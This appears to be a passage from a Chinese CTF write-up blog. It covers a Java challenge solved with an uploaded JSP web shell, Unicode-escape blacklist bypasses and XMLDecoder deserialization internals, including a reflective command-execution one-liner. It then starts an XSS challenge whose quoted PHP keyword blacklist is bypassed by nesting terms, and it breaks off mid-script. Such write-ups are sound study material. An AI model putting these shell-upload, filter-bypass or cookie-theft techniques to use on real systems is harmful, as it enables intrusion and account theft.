<p>这里直接传一个蚁剑的jsp shell上去，可以直接绕过黑名单过滤，也可以用Unicode编码绕过<br>这里的CDATA是XML的一个标记，表示其中的内容不进行处理，防止尖括号等字符被错误解析</p>
<h3 id="Unicode绕过原理"><a href="#Unicode绕过原理" class="headerlink" title="Unicode绕过原理"></a>Unicode绕过原理</h3><p>java是能解析Unicode的，比如<code>&quot;\u0072&quot;==&quot;r&quot;</code>的结果是true，既然如此，输入的内容本身能被解析时，就不应该能绕过检测，因为这个字符会被等价替换成对应的字符，这里既能用Unicode绕过json，又能用Unicode绕过黑名单写入shell，必然有他的原理</p>
<p>显然，用户输入一个<code>\u0072</code>时，在后端接受到的应该是<code>\\u0072</code>，这里的斜杠应该是认为被转义了的，既然如此，那么java本身就不会直接去解析这个Unicode编码，而是其之后的操作再次解析Unicode编码，才使得内容能既绕过检测，又成功解析。<br>绕过注册，是因为json在解析时同样接受Unicode，java接收到<code>\\u0072</code>后，认为斜杠被转义，未直接将其解析为r，但在json库解析时即认为传入的字符串为<code>\u0072</code>，再次解析，成为字符r<br>绕过上传也是类似的原理，上传时斜线被转义，未解析，但其在写入的xml文件中已经是<code>\u0072</code>这种类型的格式，再触发PrintWriter执行时，再以Unicode格式解析，在写入时已经是写入的正常字符<br>说到底也就是那种先检测再简析的经典漏洞代码类型</p>
<p>PS：虽然java部署APP的时候有很多奇怪的属性要靠xml来配置，但是jsp似乎只要传上去加能访问就能直接跑起来，所以传jsp shell效果和php一句话是差不多的</p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>垃圾的我专注于绕过根本没有注意到出题人写的其实是垃圾代码。。。<br>出题人在upload的GET方法中进行了身份校验，但POST方法并没有，因此不需要伪造admin身份直接POST传文件就能传<br>然后在upload的文件检测中虽然进行了内容过滤，但过滤之后只是给出了一个错误提示，并没有让函数退出。。。所以后面的上传代码会继续执行，也就是说，这个题目只要直接往upload路由传一个jsp shell就能全部打通。。。</p>
<h2 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h2><p>这个是全新内容，临时进行了学习。<br>XMLDecoder可以从一个xml文档中还原出对象来，而在换源出对象的过程中只要我们精心构造，就能进行命令执行。</p>
<p>跟着网上的文章简单的跟了一下执行的过程，主要看两个函数<code>startElement</code>和<code>endElement</code><br>startElement会将当前element的handler的parent指向上一层element的handler，并检查当前标签有无属性，若存在属性则根据属性的键将属性的值赋值到当前element对象的不同字段上。<br><code>endElement</code>则主要调用<code>getValueObject</code>函数，根据对象类型的不同调用的getValueObject函数会有所差异</p>
<p>简单讲一下上面这个xml在运行时的逻辑，跳过java标签的解析<br>首先进入Object标签的<code>startElement</code>，创建一个handler，由于该标签存在一个名为class的属性，先进<code>this.handler.addAttribute(name, value);</code>，找不到name对应的值，进<code>super.addAttribute(name, value);</code>，将该element的type赋值为对应的class</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// DocumentHandler.java</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">startElement</span><span class="token punctuation">(</span>String uri<span class="token punctuation">,</span> String localName<span class="token punctuation">,</span> String qName<span class="token punctuation">,</span> Attributes attributes<span class="token punctuation">)</span> <span class="token keyword">throws</span> SAXException <span class="token punctuation">{</span>
        ElementHandler parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>handler <span class="token operator">=</span> <span class="token function">getElementHandler</span><span class="token punctuation">(</span>qName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">setOwner</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">setParent</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SAXException</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> attributes<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                String name <span class="token operator">=</span> attributes<span class="token punctuation">.</span><span class="token function">getQName</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                String value <span class="token operator">=</span> attributes<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">handleException</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">startElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">addAttribute</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"idref"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>idref <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>field <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">addArgument</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// hack for compatibility</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"property"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>property <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"method"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addAttribute</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// NON-NLS: the attribute name</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>接下来进入string标签的startElement，函数上同。<br>解析到<code>&lt;/string&gt;</code>，表示string标签结束，进入endElement函数，进入到StringElementHandler的<code>getValueObject</code>，获取到string标签中的值<code>shell.jsp</code>，在<code>getValueObject</code>中实例化为字符串，然后在<code>endElement</code>中添加到父handler的argument属性中</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// ElementHandler.java</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">endElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// do nothing if no value returned</span>
        ValueObject value <span class="token operator">=</span> <span class="token function">getValueObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">.</span><span class="token function">isVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>owner<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span> value<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">addArgument</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>owner<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// StringElementHandler.java</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> ValueObject <span class="token function">getValueObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sb <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> ValueObjectImpl<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">handleException</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>sb <span class="token operator">=</span> null<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>进入void标签的<code>startElement</code>，该标签存在一个属性method，将其值赋值到当前element的对应属性上<br>处理下一个string标签，和之前的处理相同，给void标签的element添加了一个argument属性<br>由于抵达<code>&lt;/void&gt;</code>，进入void标签的<code>endElement</code>，将之前的args传入作为参数，在<code>getContextBean</code>中会调用parent的<code>getContextBean</code>，最后会进入一个无参<code>getValueObject</code>，其中以element的type和args为参数返回了实例化的一个类对象，先是返回一个type为class，args为PrintWriter的class对象，再以type为PrintWriter，args为shell.jsp创建一个PrintWriter对象，最终创建expression对象进行反射调用（expression对象是反射的一种封装）</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">final</span> ValueObject <span class="token function">getValueObject</span><span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>field <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> ValueObjectImpl<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>FieldElementHandler<span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span><span class="token function">getContextBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>field<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>idref <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> ValueObjectImpl<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token function">getVariable</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>idref<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Object bean <span class="token operator">=</span> <span class="token function">getContextBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        String name<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            name <span class="token operator">=</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> PropertyElementHandler<span class="token punctuation">.</span>SETTER
                    <span class="token operator">:</span> PropertyElementHandler<span class="token punctuation">.</span>GETTER<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>property <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            name <span class="token operator">=</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> PropertyElementHandler<span class="token punctuation">.</span>SETTER
                    <span class="token operator">:</span> PropertyElementHandler<span class="token punctuation">.</span>GETTER<span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>property<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                name <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>property<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>property<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>method<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>method
                    <span class="token operator">:</span> <span class="token string">"new"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// NON-NLS: the constructor marker</span>
        <span class="token punctuation">}</span>
        Expression expression <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Expression</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> name<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ValueObjectImpl<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">final</span> ValueObject <span class="token function">getValueObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arguments <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">getValueObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arguments<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">handleException</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>arguments <span class="token operator">=</span> null<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>第二次进入void标签并退出时，基础操作均同上，但这里由于之前已经实例化了PrintWriter对象，并把值赋到了value上，且清空了arguments，所以这里直接通过value获取到了之前的PrintWriter对象</p>
<h3 id="反射不能"><a href="#反射不能" class="headerlink" title="反射不能"></a>反射不能</h3><p>这里本来想着能不能直接写一个反射进行命令执行，但跟了一下之后发现，这里并不能存储变量，反射取得的返回值并不能保存下来进行传递，那么不保存中间变量的话，想反射执行命令大概得是这个样子的<code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)))</code><br>就目前看来XMLDecoder一个标签一个标签的解析，每次就能对一个对象调用一个方法，拿不到返回值就是没戏啦</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247488643&idx=1&sn=fc6838f86df389832ffe764f56617e51">【WP】GKCTF2021 By EDI战队</a><br><a href="https://xz.aliyun.com/t/5069">XMLDecoder解析流程分析</a><br><a href="https://y4er.com/post/java-xmldecoder/">Java XMLDecoder反序列化分析</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>[GWCTF 2019]mypassword</title>
    <url>/%5BGWCTF%202019%5Dmypassword.html</url>
    <content><![CDATA[<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>一个XSS题，开局一个登录框，试了一下admin被注册了，过滤了一些东西，注册一个号登进去看发现并不是注入，给了一个feedback界面提交反馈，大概就能猜出来是XSS了</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>在feedback界面查看源码可以看到一个被注释了的过滤</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('反馈不合法');&lt;/script>"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token string">'script'</span><span class="token punctuation">,</span><span class="token string">'iframe'</span><span class="token punctuation">,</span><span class="token string">'host'</span><span class="token punctuation">,</span><span class="token string">'onload'</span><span class="token punctuation">,</span><span class="token string">'onerror'</span><span class="token punctuation">,</span><span class="token string">'srcdoc'</span><span class="token punctuation">,</span><span class="token string">'location'</span><span class="token punctuation">,</span><span class="token string">'svg'</span><span class="token punctuation">,</span><span class="token string">'form'</span><span class="token punctuation">,</span><span class="token string">'img'</span><span class="token punctuation">,</span><span class="token string">'src'</span><span class="token punctuation">,</span><span class="token string">'getElement'</span><span class="token punctuation">,</span><span class="token string">'document'</span><span class="token punctuation">,</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token variable">$feedback</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
</code></pre>
<p>但是这个过滤其实是不完善的，从前往后遍历列表替换为空，导致使用列表后项分隔前项绕过，说到底，整个过滤只能过滤一个’cookie’字段<br>比如docucookiement这种形式，document就无法被检测出来，而cookie被替换为空后又出现了document字段<br>不过尽管如此，也还是差了点什么，不获取document.cookie似乎也拿不到什么东西（菜逼言论）<br>后来看了wp，才知道在登录时发现给出了一个.&#x2F;js&#x2F;login.js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
